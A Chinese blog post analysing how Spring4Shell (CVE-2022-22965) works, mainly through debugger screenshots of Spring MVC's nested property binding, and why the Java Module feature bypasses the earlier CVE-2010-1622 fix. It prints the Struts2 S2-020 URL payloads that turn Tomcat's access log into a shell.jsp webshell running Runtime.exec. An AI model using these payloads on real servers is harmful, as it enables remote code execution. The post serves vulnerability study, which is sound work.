前言：记录一篇自己入门java安全的故事，捋一下思路，轻量知识 ，重在调试 ！

.

这篇文章四个部分：

引入篇：整理一下CVE-2022-22965漏洞的来龙去脉

基础篇：回顾Java中一些基础的内容

调试篇：阅读Spring MVC部分源码

分析篇：分析CVE-2010-1622、CVE-2022-22965的漏洞成因

## 分析篇

( 紧接" 浅谈CVE-2022-22965漏洞成因（四）”，复现并分析一下CVE-2022-22965漏洞成因 )

### CVE-2022-22965漏洞分析

 **1、在Struts2框架的S-20的问题中的攻击手法**

这里我们仅需要了解一个思路，CVE-2022-22965中的攻击手法与这个相同，其payload如下：

    
    
    //修改写入文件所在的根目录
    http://127.0.0.1:8080/FirstStruts2/login?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
    
    //修改写入文件的名称
    http://127.0.0.1:8080/FirstStruts2/login?class.classLoader.resources.context.parent.pipeline.first.prefix=shell
    
    //修改写入文件的后缀名
    http://127.0.0.1:8080/FirstStruts2/login?
    class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
    
    //修改文件日期格式，用于切换目录
    http://127.0.0.1:8080/FirstStruts2/login?
    class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=2
    
    //访问shell.jsp将会记录日志
    http://127.0.0.1:8080/FirstStruts2/shell.jsp?=<%Runtime.getRuntime().exec("calc");%>
    

看完前面的调试过程，再看这个payload基本上没什么问题，不再过多叙述。

.带Spring MVC项目的项目部署到Tomcat中(或者Spring
Boot可执行jar，内置web服务器)，多加个module改下Payload，就能写入个日志文件，且是jsp格式的。

![wKg0C2KiOmqAfyj9AAFBHDD5o40839.png](https://image.3001.net/images/20221129/1669704148_6385a9d46dbf85afdb650.png!small)

简单的改一下，用下面的Payload，访问(无攻击效果)，看看Spring
MVC版本5中是如何对请求传参作递归解析、获取PropertyDescriptor以及在这个过程中怎么绕过了CVE-2010-1622中Spring官方的修复

    
    
    http://localhost:8090/SpringMVC5/level/info?class.module.classLoader.URLs[1]=jar:http://localhost:9999/test.jar!/
    

**2、调试Spring MVC版本5中请求传参作递归解析**

从DataBinder开始

![wKg0C2KjdIAcEePAABgUjYN0U307.png](https://image.3001.net/images/20221129/1669704149_6385a9d522affcf28f24b.png!small)

DataBinder调用AbstractPropertyAccessor的setPropertyValues方法遍历每一个参数并开始对每一个参数进行解析，我们只传了了一个需要递归解析的请求参数，所以，在setPropertyValues里只会进行一轮迭代

![wKg0C2KjdJuADlnMAADQvMd7yA4540.png](https://image.3001.net/images/20221129/1669704149_6385a9d5a2b379d530786.png!small)

AbstractPropertyAccessor调用AbstractNestablePropertyAccessor的setPropertyValue方法，在这个方法中，有解析形如"var1.var2.var3.var4.var5"这种形式的请求参数

![wKg0C2KjdKeAdKGvAACUT4kcxdk518.png](https://image.3001.net/images/20221129/1669704150_6385a9d62bca40ff2bf07.png!small)

解析class的过程如下：

![wKg0C2KjdLKABijKAABeqD9njjo371.png](https://image.3001.net/images/20221129/1669704150_6385a9d6a1003ecaa3864.png!small)

![wKg0C2KjdLeAG6K6AAB5QikWdI053.png](https://image.3001.net/images/20221129/1669704151_6385a9d721eabade47672.png!small)

![wKg0C2KjdMaAQNPYAABeSbNMhVE382.png](https://image.3001.net/images/20221129/1669704151_6385a9d7a6d071d5c67d8.png!small)

![wKg0C2KjdMqAQ4WAABQO9NsoCo055.png](https://image.3001.net/images/20221129/1669704152_6385a9d8200266b8b243e.png!small)

![wKg0C2KjdNGAY32sAABEP6IsdrQ385.png](https://image.3001.net/images/20221129/1669704152_6385a9d88d66480631388.png!small)

![wKg0C2KjdNWACPMpAAB5cz6qpMw087.png](https://image.3001.net/images/20221129/1669704153_6385a9d911861c566dd06.png!small)

![wKg0C2KjdNyAClKHAACLUQoNvHg363.png](https://image.3001.net/images/20221129/1669704153_6385a9d98e3de3e757f98.png!small)

![wKg0C2KjdOOAKVnzAADU4ibXC94978.png](https://image.3001.net/images/20221129/1669704154_6385a9da0bf5235418484.png!small)

![wKg0C2KjdOqALBceAAB0JtDENSM283.png](https://image.3001.net/images/20221129/1669704154_6385a9dacadd6daae14eb.png!small)

![wKg0C2KjdOAfGJQAACfIEgKxs136.png](https://image.3001.net/images/20221129/1669704155_6385a9db4de6b187c15a1.png!small)

解析module的过程如下：

![wKg0C2KjdPqAfbvCAABmWzHkeWA659.png](https://image.3001.net/images/20221129/1669704155_6385a9dbd63a94bfb0525.png!small)

![wKg0C2KjdPAFCdDAABXbMIv5k112.png](https://image.3001.net/images/20221129/1669704156_6385a9dc6ebdd3d2245f8.png!small)

![wKg0C2KjdQWAZ6IiAABK8Tx5Yks474.png](https://image.3001.net/images/20221129/1669704156_6385a9dcddc69bf352934.png!small)

![wKg0C2KjdQuAS2XVAABDjPqme9s021.png](https://image.3001.net/images/20221129/1669704157_6385a9dd5ef7a9664ef85.png!small)

![wKg0C2KjdRaALZfqAABDjPqme9s114.png](https://image.3001.net/images/20221129/1669704158_6385a9de12b805d6fa98f.png!small)

![wKg0C2KjdRAFRRYAABsSxXdhw756.png](https://image.3001.net/images/20221129/1669704158_6385a9de9be60d553d51e.png!small)

![wKg0C2KjdSOAbNijAACNOgMvtgs205.png](https://image.3001.net/images/20221129/1669704159_6385a9df8de500ec8535f.png!small)

![wKg0C2KjdSmAImSMAADjSvj5BjM190.png](https://image.3001.net/images/20221129/1669704160_6385a9e0122f3c0a8699a.png!small)

![wKg0C2KjdS6AMNycAABjP4x2FA822.png](https://image.3001.net/images/20221129/1669704160_6385a9e0a64a0a3db4606.png!small)

![wKg0C2KjdTSAW9ZEAABv8f4dyEs174.png](https://image.3001.net/images/20221129/1669704161_6385a9e12b7c5f7accb74.png!small)

![wKg0C2KjdTiAMFBIAABf4jFvBsc629.png](https://image.3001.net/images/20221129/1669704161_6385a9e1a8f1c7106a761.png!small)

![wKg0C2KjdT2AKdDGAABoQFRyS0627.png](https://image.3001.net/images/20221129/1669704162_6385a9e230358fbd6bf6f.png!small)

![wKg0C2KjdUOAcip6AAChehjJScY492.png](https://image.3001.net/images/20221129/1669704162_6385a9e2af0f785737d6b.png!small)

解析classLoader的过程如下：

![wKg0C2KjdUyAZebFAABpfzleeq8645.png](https://image.3001.net/images/20221129/1669704163_6385a9e345378cc22a831.png!small)

![wKg0C2KjdVGAF5y0AABsTRASDH0169.png](https://image.3001.net/images/20221129/1669704163_6385a9e3b5f3a183b1b99.png!small)

![wKg0C2KjdVaAGP9fAABIOuxz04096.png](https://image.3001.net/images/20221129/1669704164_6385a9e475e473a1272ee.png!small)

![wKg0C2KjdVABlh1AABIfijPfs797.png](https://image.3001.net/images/20221129/1669704164_6385a9e4e826482051cf9.png!small)

![wKg0C2KjdWSAIy5fAABqaCVf75U854.png](https://image.3001.net/images/20221129/1669704165_6385a9e561c9132b6a9e3.png!small)

![wKg0C2KjdWiAdeQCAAB1ws3h0k474.png](https://image.3001.net/images/20221129/1669704165_6385a9e5dacaa2baa98b6.png!small)

![wKg0C2KjdW6AIHpuAAD7tAuUSLQ185.png](https://image.3001.net/images/20221129/1669704166_6385a9e66021b6d7559d5.png!small)

![wKg0C2KjdXKAP53AADMpDf9bQg457.png](https://image.3001.net/images/20221129/1669704167_6385a9e77890a88e5a9a6.png!small)

![wKg0C2KjdXiANBLQAABeakfpcOM629.png](https://image.3001.net/images/20221129/1669704168_6385a9e80b3d489ceed4d.png!small)

![wKg0C2KjdXyAT8a3AAB8tt33Dc065.png](https://image.3001.net/images/20221129/1669704168_6385a9e8859de59d54b1c.png!small)

![wKg0C2KjdYGAeqVAAA8NWVGRIU505.png](https://image.3001.net/images/20221129/1669704169_6385a9e90d56ac2c905da.png!small)

![wKg0C2KjdYWAZmFAAACnkEzYzy0929.png](https://image.3001.net/images/20221129/1669704169_6385a9e9807250d24cf31.png!small)

![wKg0C2KjdYqAe2c2AAC1jFmy8M289.png](https://image.3001.net/images/20221129/1669704170_6385a9ea0eb1d7a9958a7.png!small)

对class.module.classLoader.URLs[]赋值的过程如下：

![wKg0C2KjdZSAHX3bAABJY0dc5Ws066.png](https://image.3001.net/images/20221129/1669704170_6385a9ea9957e05414180.png!small)

![wKg0C2KjdZmAMnzqAABmJq0rj0Y000.png](https://image.3001.net/images/20221129/1669704171_6385a9eb444026569c537.png!small)

![wKg0C2KjdZ2AZF7AAABIW26BlVU318.png](https://image.3001.net/images/20221129/1669704172_6385a9ec11c75a2d9325b.png!small)

![wKg0C2KjdaKAJvgTAABP9jncRe4901.png](https://image.3001.net/images/20221129/1669704172_6385a9ec894ac9b09b5ef.png!small)

![wKg0C2KjdaaAUCT2AABdrhkTplQ483.png](https://image.3001.net/images/20221129/1669704173_6385a9ed0e3d729ad4181.png!small)

![wKg0C2KjdaqAItbPAABPiKp7zNQ899.png](https://image.3001.net/images/20221129/1669704173_6385a9ed8c496e200f2ff.png!small)

![wKg0C2Kjda6AC0ZiAACnxp9FtLs990.png](https://image.3001.net/images/20221129/1669704174_6385a9ee2a2ad52920132.png!small)

![wKg0C2KjdbOAUNz5AAC5D2DJE88788.png](https://image.3001.net/images/20221129/1669704174_6385a9eebd349a80beaaa.png!small)

![wKg0C2KjdbiASLU4AABzQyzDAM4570.png](https://image.3001.net/images/20221129/1669704175_6385a9ef9c108f148e95d.png!small)

![wKg0C2KjdbyATw2iAADuPBHhjDw314.png](https://image.3001.net/images/20221129/1669704176_6385a9f01f596c0040013.png!small)

![wKg0C2KjdcaAOYY3AABeAzFyZXk022.png](https://image.3001.net/images/20221129/1669704176_6385a9f0a913e3bdebfc8.png!small)

![wKg0C2KjdcuALUVrAAAmMpZB0071.png](https://image.3001.net/images/20221129/1669704177_6385a9f17a8ea1c6d7f25.png!small)

![wKg0C2Kjdc6AE323AACQE3VOBZw756.png](https://image.3001.net/images/20221129/1669704178_6385a9f20c90f9f756634.png!small)

![wKg0C2KjddSAJBimAACvJmzjDUM581.png](https://image.3001.net/images/20221129/1669704178_6385a9f2757099305b791.png!small)

第一个参数解析完毕！

![wKg0C2KjddyAGQkoAABPL4q1N3w299.png](https://image.3001.net/images/20221129/1669704179_6385a9f345660199a2033.png!small)

 **3、绕过原因分析**

重点就是这里，本来的拦截规则是当内省的bean是class且获取到的PropertyDescriptor是classLoader时，CachedIntrospectionResults是不能缓存classLoader这个PropertyDescriptor的，但是jdk11中多了个Module的特性，当内省的bean是Module时，CachedIntrospectionResults就能缓存classLoader这个PropertyDescriptor了。

![wKg0C2KjdfeAU81MAAD7tAuUSLQ966.png](https://image.3001.net/images/20221129/1669704179_6385a9f3b4efc7c526b66.png!small)

.写在最后:

4月份时就分析了这个漏洞，但由于各种原因，拖到现在才总结出来，中间有许多有趣的东西都遗忘了，再加上临近期末，各种事情凑团，有很多细节的东西都没补充全。

再有就是本文重在通过调试分析整个代码执行的过程，不过多追求如何攻击，payload利用需要根据Spring部署的环境视情况而定，找到可利用链。(PS:自己也不是很懂)

.推荐阅读：

光闪师傅写的《深入理解Spring MVC源代码》

P牛师傅写的Java安全漫谈

yiran4827师傅的Struts2 S2-020在Tomcat 8下的命令执行分析

[https://cloud.tencent.com/developer/article/1035297](https://www.sec-in.com/outLinkPage/?target=https://cloud.tencent.com/developer/article/1035297)

Ruilin师傅的SpringMVC框架任意代码执行漏洞

[http://rui0.cn/archives/1158](https://www.sec-in.com/outLinkPage/?target=http://rui0.cn/archives/1158)

麦兜师傅的Spring 远程命令执行漏洞分析

[https://paper.seebug.org/1877/](https://www.sec-in.com/outLinkPage/?target=https://paper.seebug.org/1877/)

